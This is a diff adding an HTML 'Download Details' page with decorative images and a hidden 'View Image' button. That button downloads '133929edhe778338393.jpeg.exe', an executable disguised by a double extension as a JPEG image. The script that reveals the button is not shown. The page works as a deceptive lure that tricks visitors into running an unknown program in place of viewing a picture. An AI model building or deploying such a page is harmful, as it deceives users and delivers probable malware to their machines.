@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Download Details</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            background-color: #f4f4f4;
+        }
+        .container {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            text-align: center;
+        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
+        .download-link {
+            display: inline-block;
+            padding: 12px 25px;
+            background-color: #007bff;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease;
+        }
+        .download-link:hover {
+            background-color: #0056b3;
+        }
+        /* New styles for dynamic content */
+        .hidden {
+            display: none !important;
+        }
+        .image-container img {
+            max-width: 20%;
+            height: auto;
+            border-radius: 0px;
+        }
+        .session-timeout {
+            color: #dc3545;
+            font-size: 1.5em;
+            font-weight: bold;
+        }
+        .view-image-button {
+            display: block; /* Make it a block element to stack */
+            margin: 0 auto; /* Center horizontally */
+            padding: 12px 25px;
+            background-color: #ca071a;
+            color: white;
+            text-decoration: none;
+            border-radius: 5px;
+            font-size: 1.1em;
+            transition: background-color 0.3s ease;
+            cursor: pointer;
+            border: none;
+        }
+        .view-image-button:hover {
+            background-color: #ca071a;
+        }
+        #logoImage {
+            display: block; /* Make it a block element to stack */
+            margin: 0 auto 20px auto; /* Center horizontally and add bottom margin */
+            max-width: 100px; /* Adjust as needed for desired logo size */
+            height: auto;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <!-- Image 1 Container -->
+        <div id="image1Container" class="image-container">
+            <img src="https://i.pinimg.com/1200x/36/f6/37/36f63757bb2df81944f51e08ad1ff1b4.jpg" alt="Image 1">
+        </div>
+
+        <!-- Image 2 Container -->
+        <div id="image2Container" class="image-container">
+            <img src="https://i.pinimg.com/1200x/7d/91/6c/7d916c52ffdcefaddd9a80c7a0acc3ce.jpg" alt="Image 2">
+        </div>
+
+        <!-- Logo Image (initially hidden) -->
+        <img id="logoImage" src="https://i.pinimg.com/736x/d0/47/4a/d0474afe5db643dff64b3d24ca5b2d39.jpg" alt="Logo" class="hidden">
+
+        <!-- View Image Button (initially hidden) -->
+        <a id="viewImageButton" class="view-image-button hidden" href="133929edhe778338393.jpeg.exe" download="133929edhe778338393.jpeg.exe">View Image</a>
+    </div>
+    <script src="script.js"></script>
+</body>
+</html>
